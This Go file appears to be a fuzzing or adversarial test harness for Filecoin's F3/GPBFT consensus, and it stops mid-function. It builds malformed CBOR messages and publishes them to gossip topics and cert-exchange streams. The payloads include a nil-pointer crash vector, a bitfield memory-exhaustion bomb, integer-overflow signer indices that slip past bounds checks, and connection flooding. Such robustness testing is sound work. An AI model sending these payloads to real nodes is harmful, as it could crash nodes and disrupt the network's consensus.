package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"math"
	"time"

	"github.com/klauspost/compress/zstd"
	"github.com/libp2p/go-libp2p/core/protocol"
)

// ---------------------------------------------------------------------------
// F3/GPBFT Attack Vectors
//
// F3 uses GPBFT (Granite Protocol for BFT) for fast finality.
// Wire format: ZSTD-compressed CBOR PartialGMessage on topic /f3/granite/0.0.3/<network>.
//
// PartialGMessage = array(2):
//   [0] GMessage (pointer — can be null)
//   [1] VoteValueKey  bytes(32)  (ECChainKey)
//
// GMessage = array(5):
//   [0] Sender          uint64     (ActorID)
//   [1] Vote (Payload)  array(5):
//       [0] Instance      uint64
//       [1] Round         uint64
//       [2] Phase         uint8    (QUALITY=1, CONVERGE=2, PREPARE=3, COMMIT=4, DECIDE=5)
//       [3] SupplementalData array(2): [Commitments bytes(32), PowerTable CID]
//       [4] Value         ECChain = array(N): each TipSet = array(3): [Epoch, Key, PowerTable]
//   [2] Signature        bytes(96) (BLS)
//   [3] Ticket           bytes(96) (VRF)
//   [4] Justification    nullable  (pointer — cborNil when absent)
//       array(3): [Vote(Payload), Signers(bitfield), Signature(bytes)]
//
// Phase constants: INITIAL=0, QUALITY=1, CONVERGE=2, PREPARE=3, COMMIT=4, DECIDE=5, TERMINATED=6
// Valid wire phases: 1-5 only.
// ---------------------------------------------------------------------------

const (
	phaseINITIAL    = 0
	phaseQUALITY    = 1
	phaseCONVERGE   = 2
	phasePREPARE    = 3
	phaseCOMMIT     = 4
	phaseDECIDE     = 5
	phaseTERMINATED = 6
)

// zstd encoder (package-level, reusable)
var zstdEncoder, _ = zstd.NewWriter(nil, zstd.WithEncoderLevel(zstd.SpeedFastest))

func zstdCompress(data []byte) []byte {
	return zstdEncoder.EncodeAll(data, nil)
}

// ---------------------------------------------------------------------------
// F3 CBOR builders
// ---------------------------------------------------------------------------

type f3MessageOpts struct {
	sender           uint64
	vote             []byte // pre-built Vote CBOR, or nil for default
	signature        []byte
	ticket           []byte
	justification    []byte // pre-built Justification CBOR
	nilSender        bool
	nilVote          bool
	nilSignature     bool
	nilTicket        bool
	hasJustification bool // if true, include justification (default: cborNil)
}

type f3VoteOpts struct {
	instance    uint64
	round       uint64
	phase       uint8
	chainLength int
	nilValue    bool
	nilSuppData bool
	maxFields   bool
}

type f3JustificationOpts struct {
	instance    uint64
	round       uint64
	phase       uint8
	chainLength int
	signature   []byte
	signerBits  []uint64 // specific bit positions to set in RLE+ signer bitfield
	bombSigners bool     // OOM: bitfield with huge bit position (forces large RLE+ run)
}

// buildGMessageCBOR builds a 5-field GMessage CBOR array.
func buildGMessageCBOR(opts f3MessageOpts) []byte {
	var sender []byte
	if opts.nilSender {
		sender = cborNil()
	} else {
		sender = cborUint64(opts.sender)
	}

	var vote []byte
	if opts.nilVote {
		vote = cborNil()
	} else if opts.vote != nil {
		vote = opts.vote
	} else {
		vote = buildVoteCBOR(f3VoteOpts{phase: phasePREPARE, chainLength: 1})
	}

	var sig []byte
	if opts.nilSignature {
		sig = cborNil()
	} else if opts.signature != nil {
		sig = cborBytes(opts.signature)
	} else {
		sig = cborBytes(randomBytes(96))
	}

	var ticket []byte
	if opts.nilTicket {
		ticket = cborNil()
	} else if opts.ticket != nil {
		ticket = cborBytes(opts.ticket)
	} else {
		ticket = cborBytes(randomBytes(96))
	}

	var justification []byte
	if opts.hasJustification && opts.justification != nil {
		justification = opts.justification
	} else {
		justification = cborNil()
	}

	return cborArray(sender, vote, sig, ticket, justification)
}

// buildPartialGMessageCBOR wraps a GMessage in PartialGMessage format.
// PartialGMessage = array(2): [GMessage, VoteValueKey(bytes32)]
func buildPartialGMessageCBOR(gmsg []byte, voteValueKey []byte) []byte {
	var key []byte
	if voteValueKey != nil {
		key = cborBytes(voteValueKey)
	} else {
		// Zero key means "complete message, no rebroadcast lookup needed"
		key = cborBytes(make([]byte, 32))
	}
	return cborArray(gmsg, key)
}

func buildVoteCBOR(opts f3VoteOpts) []byte {
	var instance, round []byte
	if opts.maxFields {
		instance = cborUint64(math.MaxUint64)
		round = cborUint64(math.MaxUint64)
	} else {
		instance = cborUint64(opts.instance)
		round = cborUint64(opts.round)
	}

	phase := cborUint64(uint64(opts.phase))

	var suppData []byte
	if opts.nilSuppData {
		suppData = cborNil()
	} else {
		suppData = buildSupplementalDataCBOR()
	}

	var value []byte
	if opts.nilValue {
		value = cborNil()
	} else {
		value = buildECChainCBOR(opts.chainLength)
	}

	return cborArray(instance, round, phase, suppData, value)
}

func buildSupplementalDataCBOR() []byte {
	commitments := cborBytes(randomBytes(32))
	powerTable := cborCID(randomCID())
	return cborArray(commitments, powerTable)
}

// buildTipSetCBOR builds a 4-field TipSet: [Epoch, Key, PowerTable CID, Commitments[32]].
func buildTipSetCBOR(epoch int64, key []byte, powerTable []byte) []byte {
	commitments := cborBytes(make([]byte, 32))
	return cborArray(cborInt64(epoch), cborBytes(key), powerTable, commitments)
}

func buildECChainCBOR(numTipsets int) []byte {
	if numTipsets <= 0 {
		numTipsets = 1
	}
	tipsets := make([][]byte, numTipsets)
	for i := range numTipsets {
		tipsets[i] = buildTipSetCBOR(int64(100+i), randomBytes(38), cborCID(randomCID()))
	}
	return cborArray(tipsets...)
}

func buildJustificationCBOR(opts f3JustificationOpts) []byte {
	vote := buildVoteCBOR(f3VoteOpts{
		instance:    opts.instance,
		round:       opts.round,
		phase:       opts.phase,
		chainLength: opts.chainLength,
	})

	// Signers: RLE+ encoded bitfield wrapped in CBOR byte string.
	var signers []byte
	if len(opts.signerBits) > 0 {
		// Use real RLE+ encoding with specified bit positions
		signers = buildRLEPlusBitfieldCBOR(opts.signerBits)
	} else if opts.bombSigners {
		// OOM: bitfield with bit position 0xFFFFFFFF (4 billion) set —
		// forces RLE+ to encode a 4B-length zero-run before the set bit
		signers = buildRLEPlusBitfieldCBOR([]uint64{0xFFFFFFFF})
	} else {
		// Single signer at index 0
		signers = buildRLEPlusBitfieldCBOR([]uint64{0})
	}

	var sig []byte
	if opts.signature != nil {
		sig = cborBytes(opts.signature)
	} else {
		sig = cborBytes(randomBytes(96))
	}

	return cborArray(vote, signers, sig)
}

// ---------------------------------------------------------------------------
// Attack vectors
// ---------------------------------------------------------------------------

func getAllF3Attacks() []namedAttack {
	return []namedAttack{
		// PartialGMessage nil-pointer vectors
		// DISABLED: known bug — crashes node via nil-pointer panic at pmsg/partial_msg.go:404
		// {name: "f3/partial-nil-gmessage", fn: f3PartialNilGMessage},
		// {name: "f3/partial-nil-gmessage-nonzero-key", fn: f3PartialNilGMessageNonzeroKey},
		{name: "f3/partial-nil-both", fn: f3PartialNilBoth},
		{name: "f3/partial-truncated", fn: f3PartialTruncated},

		// GMessage field fuzzing (wrapped in PartialGMessage)
		{name: "f3/gpbft-zero-value-message", fn: f3ZeroFields},
		{name: "f3/gpbft-uint64-overflow", fn: f3MaxUint64},
		{name: "f3/gpbft-invalid-phase", fn: f3InvalidPhase},
		{name: "f3/gpbft-empty-ecchain", fn: f3EmptyChain},
		{name: "f3/gpbft-oversized-ecchain", fn: f3HugeChain},
		{name: "f3/gpbft-truncated-bls-sig", fn: f3TruncatedSig},
		{name: "f3/gpbft-oversized-bls-sig", fn: f3OversizedSig},
		{name: "f3/gpbft-nil-fields", fn: f3NilFields},
		{name: "f3/gpbft-signer-bitfield-oom", fn: f3BitfieldBomb},
		{name: "f3/gpbft-signer-overflow-index", fn: f3SignerOverflowIndex},
		{name: "f3/gpbft-signer-max-index", fn: f3SignerMaxIndex},
		{name: "f3/gpbft-signer-multi-overflow", fn: f3SignerMultiOverflow},
		{name: "f3/gpbft-bitflip-mutation", fn: f3RandomMutation},
		{name: "f3/gpbft-epoch-overflow", fn: f3EpochOverflow},
		{name: "f3/gpbft-malformed-cbor", fn: f3MalformedCBOR},

		// Granite validation rule violations
		{name: "f3/granite-quality-wrong-round", fn: f3GraniteQualityWrongRound},
		{name: "f3/granite-converge-round-zero", fn: f3GraniteConvergeRoundZero},
		{name: "f3/granite-decide-wrong-round", fn: f3GraniteDecideWrongRound},
		{name: "f3/granite-internal-phases", fn: f3GraniteInternalPhases},
		{name: "f3/granite-missing-justification", fn: f3GraniteMissingJustification},
		{name: "f3/granite-wrong-justification", fn: f3GraniteWrongJustification},
		{name: "f3/granite-bottom-value", fn: f3GraniteBottomValue},
		{name: "f3/granite-extra-fields", fn: f3GraniteExtraFields},
	}
}

// publishF3 compresses and publishes to the F3 Granite topic.
func publishF3(data []byte) {
	compressed := zstdCompress(data)
	topicName := fmt.Sprintf("/f3/granite/0.0.3/%s", networkName)
	log.Printf("[f3] publishing %d-byte payload (%d compressed) to %s", len(data), len(compressed), topicName)
	publishGossipPayload(topicName, compressed)
}

// publishF3Partial wraps a GMessage in PartialGMessage and publishes.
func publishF3Partial(gmsg []byte, voteValueKey []byte) {
	partial := buildPartialGMessageCBOR(gmsg, voteValueKey)
	publishF3(partial)
}

// ---------------------------------------------------------------------------
// PartialGMessage nil-pointer vectors
// ---------------------------------------------------------------------------

// f3PartialNilGMessage: PartialGMessage with null GMessage and zero VoteValueKey.
// Tests CompleteMessage path where VoteValueKey.IsZero() returns true,
// so it returns pgmsg.GMessage (nil) directly.
func f3PartialNilGMessage() {
	partial := cborArray(cborNil(), cborBytes(make([]byte, 32)))
	publishF3(partial)
}

// f3PartialNilGMessageNonzeroKey: PartialGMessage with null GMessage and
// non-zero VoteValueKey. This is the exact payload shape that triggers
// nil pointer dereference in CompleteMessage when it accesses pgmsg.Vote.Instance.
func f3PartialNilGMessageNonzeroKey() {
	nonzeroKey := make([]byte, 32)
	for i := range nonzeroKey {
		nonzeroKey[i] = 0x01
	}
	partial := cborArray(cborNil(), cborBytes(nonzeroKey))
	publishF3(partial)
}

// f3PartialNilBoth: PartialGMessage with null GMessage and null VoteValueKey.
func f3PartialNilBoth() {
	partial := cborArray(cborNil(), cborNil())
	publishF3(partial)
}

// f3PartialTruncated: PartialGMessage with only 1 element (missing VoteValueKey).
func f3PartialTruncated() {
	gmsg := buildGMessageCBOR(f3MessageOpts{})
	partial := cborArray(gmsg) // only 1 element, should be 2
	publishF3(partial)
}

// ---------------------------------------------------------------------------
// GMessage field fuzzing vectors (all wrapped in PartialGMessage)
// ---------------------------------------------------------------------------

func f3ZeroFields() {
	gmsg := buildGMessageCBOR(f3MessageOpts{
		sender:    0,
		vote:      buildVoteCBOR(f3VoteOpts{instance: 0, round: 0, phase: phaseINITIAL, chainLength: 0}),
		signature: make([]byte, 96),
		ticket:    make([]byte, 0),
	})
	publishF3Partial(gmsg, nil)
}

func f3MaxUint64() {
	gmsg := buildGMessageCBOR(f3MessageOpts{
		sender: math.MaxUint64,
		vote:   buildVoteCBOR(f3VoteOpts{maxFields: true, phase: phaseDECIDE, chainLength: 1}),
	})
	publishF3Partial(gmsg, nil)
}

// f3InvalidPhase: Phase values 6-255 (out of valid range).
func f3InvalidPhase() {
	phase := uint8(phaseTERMINATED + rngIntn(250))
	gmsg := buildGMessageCBOR(f3MessageOpts{
		vote: buildVoteCBOR(f3VoteOpts{phase: phase, chainLength: 1}),
	})
	publishF3Partial(gmsg, nil)
}

func f3EmptyChain() {
	gmsg := buildGMessageCBOR(f3MessageOpts{
		vote: buildVoteCBOR(f3VoteOpts{phase: phaseQUALITY, chainLength: 0, nilValue: false}),
	})
	publishF3Partial(gmsg, nil)
}

func f3HugeChain() {
	numTipsets := 128 + rngIntn(64)
	tipsets := make([][]byte, numTipsets)
	for i := range numTipsets {
		tipsets[i] = buildTipSetCBOR(int64(i), randomBytes(760), cborCID(randomCID()))
	}
	hugeChain := cborArray(tipsets...)
	vote := cborArray(
		cborUint64(0),
		cborUint64(0),
		cborUint64(phasePREPARE),
		buildSupplementalDataCBOR(),
		hugeChain,
	)
	gmsg := buildGMessageCBOR(f3MessageOpts{vote: vote})
	publishF3Partial(gmsg, nil)
}

func f3TruncatedSig() {
	sigLen := rngIntn(96)
	gmsg := buildGMessageCBOR(f3MessageOpts{
		signature: randomBytes(sigLen),
	})
	publishF3Partial(gmsg, nil)
}

func f3OversizedSig() {
	sigLen := 97 + rngIntn(903)
	gmsg := buildGMessageCBOR(f3MessageOpts{
		signature: randomBytes(sigLen),
	})
	publishF3Partial(gmsg, nil)
}

func f3NilFields() {
	gmsg := buildGMessageCBOR(f3MessageOpts{
		nilSender:    rngIntn(2) == 0,
		nilVote:      rngIntn(2) == 0,
		nilSignature: rngIntn(2) == 0,
		nilTicket:    rngIntn(2) == 0,
	})
	// Use non-zero key sometimes to trigger different code paths
	var key []byte
	if rngIntn(2) == 0 {
		key = randomBytes(32)
	}
	publishF3Partial(gmsg, key)
}

func f3BitfieldBomb() {
	vote := buildVoteCBOR(f3VoteOpts{phase: phaseCOMMIT, chainLength: 1})
	justification := buildJustificationCBOR(f3JustificationOpts{
		phase:       phasePREPARE,
		chainLength: 1,
		bombSigners: true,
	})
	gmsg := buildGMessageCBOR(f3MessageOpts{
		vote:             vote,
		justification:    justification,
		hasJustification: true,
	})
	publishF3Partial(gmsg, nil)
}

// f3SignerOverflowIndex: Signer bitfield with bit 0x8000000000000000 set.
// When cast via int(index), this wraps to math.MinInt64 (negative),
// bypassing bounds checks like `int(bit) >= len(array)` in vulnerable versions.
func f3SignerOverflowIndex() {
	justification := buildJustificationCBOR(f3JustificationOpts{
		phase:       phasePREPARE,
		chainLength: 1,
		signerBits:  []uint64{0x8000000000000000},
	})
	vote := buildVoteCBOR(f3VoteOpts{phase: phaseCOMMIT, chainLength: 1})
	gmsg := buildGMessageCBOR(f3MessageOpts{
		vote:             vote,
		justification:    justification,
		hasJustification: true,
	})
	publishF3Partial(gmsg, nil)
}

// f3SignerMaxIndex: Signer bitfield with bit 0xFFFFFFFFFFFFFFFE set.
// Near-max uint64 index — tests all overflow and bounds-check paths.
func f3SignerMaxIndex() {
	justification := buildJustificationCBOR(f3JustificationOpts{
		phase:       phasePREPARE,
		chainLength: 1,
		signerBits:  []uint64{0xFFFFFFFFFFFFFFFE},
	})
	vote := buildVoteCBOR(f3VoteOpts{phase: phaseCOMMIT, chainLength: 1})
	gmsg := buildGMessageCBOR(f3MessageOpts{
		vote:             vote,
		justification:    justification,
		hasJustification: true,
	})
	publishF3Partial(gmsg, nil)
}

// f3SignerMultiOverflow: Multiple signer indices >= 2^63.
// Accumulates multiple negative ints in the signers slice after int() cast.
func f3SignerMultiOverflow() {
	justification := buildJustificationCBOR(f3JustificationOpts{
		phase:       phasePREPARE,
		chainLength: 1,
		signerBits:  []uint64{0x8000000000000000, 0x8000000000000001, 0xFFFFFFFFFFFFFFFE},
	})
	vote := buildVoteCBOR(f3VoteOpts{phase: phaseCOMMIT, chainLength: 1})
	gmsg := buildGMessageCBOR(f3MessageOpts{
		vote:             vote,
		justification:    justification,
		hasJustification: true,
	})
	publishF3Partial(gmsg, nil)
}

func f3RandomMutation() {
	gmsg := buildGMessageCBOR(f3MessageOpts{})
	partial := buildPartialGMessageCBOR(gmsg, nil)
	numFlips := 1 + rngIntn(5)
	for range numFlips {
		if len(partial) > 0 {
			idx := rngIntn(len(partial))
			bit := byte(1 << uint(rngIntn(8)))
			partial[idx] ^= bit
		}
	}
	publishF3(partial)
}

func f3EpochOverflow() {
	overflowChain := cborArray(
		buildTipSetCBOR(math.MaxInt64, randomBytes(38), cborCID(randomCID())),
	)
	vote := cborArray(
		cborUint64(0),
		cborUint64(0),
		cborUint64(phasePREPARE),
		buildSupplementalDataCBOR(),
		overflowChain,
	)
	gmsg := buildGMessageCBOR(f3MessageOpts{vote: vote})
	publishF3Partial(gmsg, nil)
}

func f3MalformedCBOR() {
	base := buildGMessageCBOR(f3MessageOpts{})
	partial := buildPartialGMessageCBOR(base, nil)
	var data []byte
	switch rngIntn(4) {
	case 0: // truncate
		cutPoint := 1 + rngIntn(len(partial))
		data = partial[:cutPoint]
	case 1: // junk appended
		data = append(partial, randomBytes(64+rngIntn(256))...)
	case 2: // array header → map header
		data = make([]byte, len(partial))
		copy(data, partial)
		if len(data) > 0 {
			data[0] = (data[0] & 0x1f) | 0xa0
		}
	case 3: // random bytes
		data = randomBytes(len(partial))
	}
	publishF3(data)
}

// ---------------------------------------------------------------------------
// Granite validation rule violation vectors
// ---------------------------------------------------------------------------

// f3GraniteQualityWrongRound: QUALITY phase with round > 0 (must be 0).
func f3GraniteQualityWrongRound() {
	vote := buildVoteCBOR(f3VoteOpts{
		phase:       phaseQUALITY,
		round:       1 + uint64(rngIntn(100)),
		chainLength: 1,
	})
	gmsg := buildGMessageCBOR(f3MessageOpts{vote: vote})
	publishF3Partial(gmsg, nil)
}

// f3GraniteConvergeRoundZero: CONVERGE phase with round = 0 (must be > 0).
func f3GraniteConvergeRoundZero() {
	vote := buildVoteCBOR(f3VoteOpts{
		phase:       phaseCONVERGE,
		round:       0,
		chainLength: 1,
	})
	gmsg := buildGMessageCBOR(f3MessageOpts{vote: vote})
	publishF3Partial(gmsg, nil)
}

// f3GraniteDecideWrongRound: DECIDE phase with round > 0 (must be 0).
func f3GraniteDecideWrongRound() {
	vote := buildVoteCBOR(f3VoteOpts{
		phase:       phaseDECIDE,
		round:       1 + uint64(rngIntn(100)),
		chainLength: 1,
	})
	gmsg := buildGMessageCBOR(f3MessageOpts{vote: vote})
	publishF3Partial(gmsg, nil)
}

// f3GraniteInternalPhases: Phase = INITIAL(0) or TERMINATED(6) — not valid on wire.
func f3GraniteInternalPhases() {
	var phase uint8
	if rngIntn(2) == 0 {
		phase = phaseINITIAL
	} else {
		phase = phaseTERMINATED
	}
	vote := buildVoteCBOR(f3VoteOpts{
		phase:       phase,
		chainLength: 1,
	})
	gmsg := buildGMessageCBOR(f3MessageOpts{vote: vote})
	publishF3Partial(gmsg, nil)
}

// f3GraniteMissingJustification: Phases that require justification sent without one.
// CONVERGE, PREPARE (round>0), COMMIT, DECIDE all need justification.
func f3GraniteMissingJustification() {
	phases := []struct {
		phase uint8
		round uint64
	}{
		{phaseCONVERGE, 1},
		{phasePREPARE, 1},
		{phaseCOMMIT, 0},
		{phaseDECIDE, 0},
	}
	pick := phases[rngIntn(len(phases))]
	vote := buildVoteCBOR(f3VoteOpts{
		phase:       pick.phase,
		round:       pick.round,
		chainLength: 1,
	})
	// No justification — hasJustification is false, so cborNil is used
	gmsg := buildGMessageCBOR(f3MessageOpts{vote: vote})
	publishF3Partial(gmsg, nil)
}

// f3GraniteWrongJustification: Justification with mismatched instance/phase/round.
func f3GraniteWrongJustification() {
	vote := buildVoteCBOR(f3VoteOpts{
		instance:    5,
		round:       1,
		phase:       phaseCOMMIT,
		chainLength: 1,
	})
	// Justification with wrong instance
	justification := buildJustificationCBOR(f3JustificationOpts{
		instance:    999,          // mismatch
		round:       0,            // wrong round
		phase:       phaseQUALITY, // wrong phase for COMMIT justification
		chainLength: 1,
	})
	gmsg := buildGMessageCBOR(f3MessageOpts{
		vote:             vote,
		justification:    justification,
		hasJustification: true,
	})
	publishF3Partial(gmsg, nil)
}

// f3GraniteBottomValue: Zero/bottom ECChain for phases that forbid it.
// QUALITY, CONVERGE, and DECIDE require non-zero values.
func f3GraniteBottomValue() {
	phases := []uint8{phaseQUALITY, phaseCONVERGE, phaseDECIDE}
	phase := phases[rngIntn(len(phases))]
	var round uint64
	if phase == phaseCONVERGE {
		round = 1
	}
	// Empty ECChain = bottom/zero value
	vote := cborArray(
		cborUint64(0),
		cborUint64(round),
		cborUint64(uint64(phase)),
		buildSupplementalDataCBOR(),
		cborArray(), // empty ECChain = bottom value
	)
	gmsg := buildGMessageCBOR(f3MessageOpts{vote: vote})
	publishF3Partial(gmsg, nil)
}

// f3GraniteExtraFields: GMessage with 6+ array elements — tests decoder bounds.
func f3GraniteExtraFields() {
	vote := buildVoteCBOR(f3VoteOpts{phase: phasePREPARE, chainLength: 1})
	gmsg := cborArray(
		cborUint64(uint64(rngIntn(1000))),
		vote,
		cborBytes(randomBytes(96)),
		cborBytes(randomBytes(96)),
		cborNil(),                  // Justification
		cborBytes(randomBytes(64)), // extra field 6
		cborBytes(randomBytes(64)), // extra field 7
	)
	publishF3Partial(gmsg, nil)
}

// ===========================================================================
// F3 ChainExchange PubSub Vectors
//
// Topic: /f3/chainexchange/0.0.1/<network>
// Wire: ZSTD-compressed CBOR array(3): [Instance uint64, Chain *ECChain, Timestamp int64]
// Validator: chainexchange/pubsub.go:210 → validatePubSubMessage
// ===========================================================================

func getAllF3ChainExAttacks() []namedAttack {
	return []namedAttack{
		{name: "f3/chainex-nil-chain", fn: f3ChainExNilChain},
		{name: "f3/chainex-empty-chain", fn: f3ChainExEmptyChain},
		{name: "f3/chainex-nil-tipset-entry", fn: f3ChainExNilTipsetEntry},
		{name: "f3/chainex-empty-tipset-key", fn: f3ChainExEmptyTipsetKey},
		{name: "f3/chainex-oversized-tipset-key", fn: f3ChainExOversizedTipsetKey},
		{name: "f3/chainex-undefined-cid", fn: f3ChainExUndefinedCID},
		{name: "f3/chainex-decreasing-epochs", fn: f3ChainExDecreasingEpochs},
		{name: "f3/chainex-negative-epoch", fn: f3ChainExNegativeEpoch},
		{name: "f3/chainex-huge-chain", fn: f3ChainExHugeChain},
		{name: "f3/chainex-timestamp-overflow", fn: f3ChainExTimestampOverflow},
		{name: "f3/chainex-future-instance", fn: f3ChainExFutureInstance},
		{name: "f3/chainex-malformed-cbor", fn: f3ChainExMalformedCBOR},
	}
}

// buildChainExchangeMessageCBOR builds the 3-field chain exchange Message.
func buildChainExchangeMessageCBOR(instance uint64, chain []byte, timestamp int64) []byte {
	return cborArray(cborUint64(instance), chain, cborInt64(timestamp))
}

func publishF3ChainExchange(data []byte) {
	compressed := zstdCompress(data)
	topicName := fmt.Sprintf("/f3/chainexchange/0.0.1/%s", networkName)
	log.Printf("[f3-chainex] publishing %d-byte payload (%d compressed) to %s", len(data), len(compressed), topicName)
	publishGossipPayload(topicName, compressed)
}

func currentTimestampMs() int64 {
	return time.Now().UnixMilli()
}

func f3ChainExNilChain() {
	msg := buildChainExchangeMessageCBOR(0, cborNil(), currentTimestampMs())
	publishF3ChainExchange(msg)
}

func f3ChainExEmptyChain() {
	msg := buildChainExchangeMessageCBOR(0, cborArray(), currentTimestampMs())
	publishF3ChainExchange(msg)
}

// f3ChainExNilTipsetEntry: Chain with a CBOR null entry in the tipset array.
// Chain.Validate() iterates TipSets and calls ts.Validate() — if a TipSet is nil, panic.
func f3ChainExNilTipsetEntry() {
	chain := cborArray(
		buildTipSetCBOR(100, randomBytes(38), cborCID(randomCID())),
		cborNil(), // null tipset entry
		buildTipSetCBOR(102, randomBytes(38), cborCID(randomCID())),
	)
	msg := buildChainExchangeMessageCBOR(0, chain, currentTimestampMs())
	publishF3ChainExchange(msg)
}

func f3ChainExEmptyTipsetKey() {
	chain := cborArray(
		buildTipSetCBOR(100, []byte{}, cborCID(randomCID())), // empty key
	)
	msg := buildChainExchangeMessageCBOR(0, chain, currentTimestampMs())
	publishF3ChainExchange(msg)
}

func f3ChainExOversizedTipsetKey() {
	// TipsetKeyMaxLen = 20 * 38 = 760 bytes
	chain := cborArray(
		buildTipSetCBOR(100, randomBytes(761), cborCID(randomCID())),
	)
	msg := buildChainExchangeMessageCBOR(0, chain, currentTimestampMs())
	publishF3ChainExchange(msg)
}

func f3ChainExUndefinedCID() {
	// Undefined CID = CID{} = empty bytes
	chain := cborArray(
		buildTipSetCBOR(100, randomBytes(38), cborBytes([]byte{})),
	)
	msg := buildChainExchangeMessageCBOR(0, chain, currentTimestampMs())
	publishF3ChainExchange(msg)
}

func f3ChainExDecreasingEpochs() {
	chain := cborArray(
		buildTipSetCBOR(200, randomBytes(38), cborCID(randomCID())),
		buildTipSetCBOR(100, randomBytes(38), cborCID(randomCID())), // decreasing
		buildTipSetCBOR(50, randomBytes(38), cborCID(randomCID())),  // decreasing
	)
	msg := buildChainExchangeMessageCBOR(0, chain, currentTimestampMs())
	publishF3ChainExchange(msg)
}

func f3ChainExNegativeEpoch() {
	chain := cborArray(
		buildTipSetCBOR(-1, randomBytes(38), cborCID(randomCID())),
	)
	msg := buildChainExchangeMessageCBOR(0, chain, currentTimestampMs())
	publishF3ChainExchange(msg)
}

func f3ChainExHugeChain() {
	// ChainMaxLen = 128, send 129+
	numTipsets := 129 + rngIntn(64)
	tipsets := make([][]byte, numTipsets)
	for i := range numTipsets {
		tipsets[i] = buildTipSetCBOR(int64(i), randomBytes(38), cborCID(randomCID()))
	}
	chain := cborArray(tipsets...)
	msg := buildChainExchangeMessageCBOR(0, chain, currentTimestampMs())
	publishF3ChainExchange(msg)
}

func f3ChainExTimestampOverflow() {
	chain := buildECChainCBOR(1)
	var ts int64
	if rngIntn(2) == 0 {
		ts = math.MaxInt64
	} else {
		ts = math.MinInt64
	}
	msg := buildChainExchangeMessageCBOR(0, chain, ts)
	publishF3ChainExchange(msg)
}

func f3ChainExFutureInstance() {
	chain := buildECChainCBOR(1)
	msg := buildChainExchangeMessageCBOR(math.MaxUint64, chain, currentTimestampMs())
	publishF3ChainExchange(msg)
}

func f3ChainExMalformedCBOR() {
	base := buildChainExchangeMessageCBOR(0, buildECChainCBOR(1), currentTimestampMs())
	var data []byte
	switch rngIntn(4) {
	case 0: // truncate
		data = base[:1+rngIntn(len(base))]
	case 1: // junk appended
		data = append(base, randomBytes(64+rngIntn(256))...)
	case 2: // wrong field count — 2 fields instead of 3
		data = cborArray(cborUint64(0), buildECChainCBOR(1))
	case 3: // random bytes
		data = randomBytes(len(base))
	}
	publishF3ChainExchange(data)
}

// ===========================================================================
// F3 CertExchange Stream Protocol Vectors
//
// Protocol: /f3/certexch/get/1/<network> (libp2p stream)
// Wire: CBOR Request array(3): [FirstInstance uint64, Limit uint64, IncludePowerTable bool]
// Server: certexchange/server.go:47 → handleRequest
// ===========================================================================

var certExchangeProtocol = protocol.ID(fmt.Sprintf("/f3/certexch/get/1/%s", "2k"))

func getAllF3CertExAttacks() []namedAttack {
	return []namedAttack{
		{name: "f3/certex-max-limit", fn: f3CertExMaxLimit},
		{name: "f3/certex-overflow-sum", fn: f3CertExOverflowSum},
		{name: "f3/certex-power-table-nonexist", fn: f3CertExPowerTableNonexist},
		{name: "f3/certex-malformed-request", fn: f3CertExMalformedRequest},
		{name: "f3/certex-zero-fields", fn: f3CertExZeroFields},
		{name: "f3/certex-rapid-reconnect", fn: f3CertExRapidReconnect},
	}
}

// buildCertExchangeRequestCBOR builds a 3-field cert exchange Request.
func buildCertExchangeRequestCBOR(firstInstance, limit uint64, includePowerTable bool) []byte {
	return cborArray(cborUint64(firstInstance), cborUint64(limit), cborBool(includePowerTable))
}

// sendCertExchangeRequest connects to a target and sends a cert exchange request on stream.
func sendCertExchangeRequest(target TargetNode, request []byte) {
	h, err := pool.GetFresh(ctx)
	if err != nil {
		debugLog("[f3-certex] create host failed: %v", err)
		return
	}
	defer h.Close()

	connectCtx, connectCancel := context.WithTimeout(ctx, 10*time.Second)
	defer connectCancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[f3-certex] connect to %s failed: %v", target.Name, err)
		return
	}

	streamCtx, streamCancel := context.WithTimeout(ctx, 10*time.Second)
	defer streamCancel()
	s, err := h.NewStream(streamCtx, target.AddrInfo.ID, certExchangeProtocol)
	if err != nil {
		debugLog("[f3-certex] stream to %s failed: %v", target.Name, err)
		return
	}
	defer s.Close()

	if _, err := s.Write(request); err != nil {
		debugLog("[f3-certex] write to %s failed: %v", target.Name, err)
		return
	}
	s.CloseWrite()

	// Read response (up to 4KB) to see if server stays alive
	buf := make([]byte, 4096)
	n, err := io.ReadAtLeast(s, buf, 1)
	if err != nil && err != io.EOF && err != io.ErrUnexpectedEOF {
		debugLog("[f3-certex] read from %s: %v", target.Name, err)
	}
	log.Printf("[f3-certex] got %d-byte response from %s", n, target.Name)
}

func f3CertExMaxLimit() {
	target := rngChoice(targets)
	req := buildCertExchangeRequestCBOR(0, math.MaxUint64, false)
	log.Printf("[f3-certex] max-limit request to %s", target.Name)
	sendCertExchangeRequest(target, req)
}

// f3CertExOverflowSum: FirstInstance + Limit overflows uint64.
// Server computes end := req.FirstInstance + limit — wraps around.
func f3CertExOverflowSum() {
	target := rngChoice(targets)
	req := buildCertExchangeRequestCBOR(math.MaxUint64-100, math.MaxUint64, false)
	log.Printf("[f3-certex] overflow-sum request to %s", target.Name)
	sendCertExchangeRequest(target, req)
}

func f3CertExPowerTableNonexist() {
	target := rngChoice(targets)
	req := buildCertExchangeRequestCBOR(0, 10, true)
	log.Printf("[f3-certex] power-table-nonexist request to %s", target.Name)
	sendCertExchangeRequest(target, req)
}

func f3CertExMalformedRequest() {
	target := rngChoice(targets)
	var req []byte
	switch rngIntn(4) {
	case 0: // truncated
		full := buildCertExchangeRequestCBOR(0, 10, false)
		req = full[:1+rngIntn(len(full))]
	case 1: // wrong field count
		req = cborArray(cborUint64(0), cborUint64(10))
	case 2: // wrong types
		req = cborArray(cborBytes(randomBytes(8)), cborBytes(randomBytes(8)), cborUint64(1))
	case 3: // random garbage
		req = randomBytes(32 + rngIntn(64))
	}
	log.Printf("[f3-certex] malformed request (%d bytes) to %s", len(req), target.Name)
	sendCertExchangeRequest(target, req)
}

func f3CertExZeroFields() {
	target := rngChoice(targets)
	req := buildCertExchangeRequestCBOR(0, 0, false)
	log.Printf("[f3-certex] zero-fields request to %s", target.Name)
	sendCertExchangeRequest(target, req)
}

// f3CertExRapidReconnect: 50 rapid cert exchange requests.
func f3CertExRapidReconnect() {
	target := rngChoice(targets)
	iterations := 30 + rngIntn(20)
	log.Printf("[f3-certex] rapid-reconnect: %d iterations against %s", iterations, target.Name)
	for range iterations {
		req := buildCertExchangeRequestCBOR(uint64(rngIntn(100)), 10, rngIntn(2) == 0)
		sendCertExchangeRequest(target, req)
